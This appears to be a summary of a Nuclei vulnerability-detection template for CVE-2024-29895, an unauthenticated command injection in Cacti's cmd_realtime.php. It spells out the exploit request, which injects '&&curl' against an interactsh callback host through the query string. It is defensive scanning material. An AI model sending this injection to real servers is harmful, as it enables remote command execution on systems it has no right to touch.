---
cve_id: CVE-2024-29895
template_path: nuclei-templates/http/cves/2024/CVE-2024-29895.yaml
affected_product: Cacti cmd_realtime.php
severity: critical
authentication: none
external_callback: true
affected_versions: 1.3.x DEV branch
preconditions: PHP register_argc_argv option set to On
poc_classification: rce
---

## Vulnerability

Cacti cmd_realtime.php contains a command injection vulnerability (CVE-2024-29895, CWE-77) in the 1.3.x DEV branch. Any unauthenticated user can execute arbitrary commands on the server if PHP's `register_argc_argv` option is set to On (default in many environments such as the official PHP Docker image). The flaw occurs because `$poller_id` from `$_SERVER['argv']` (controllable via the URL query string) is used unsafely for command execution in cmd_realtime.php line 119. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (10.0).

## PoC / Detection
Classification: rce

The template issues a GET request to `{{BaseURL}}/cacti/cmd_realtime.php?1+1&&curl%20{{interactsh-url}}+1+1+1` to trigger command execution that performs an out-of-band HTTP callback. It verifies exploitation by matching on the interactsh HTTP protocol, curl User-Agent in the request, and HTTP 200 status.

## References
- https://github.com/Stuub/CVE-2024-29895-CactiRCE-PoC
- https://github.com/Cacti/cacti/blob/501712998589763d411a68d35e3cda98fd9cfd18/cmd_realtime.php#L119
- https://github.com/Cacti/cacti/commit/53e8014d1f082034e0646edc6286cde3800c683d
- https://github.com/Cacti/cacti/commit/99633903cad0de5ace636249de16f77e57a3c8fc
- https://github.com/Cacti/cacti/security/advisories/GHSA-cr28-x256-xf5m
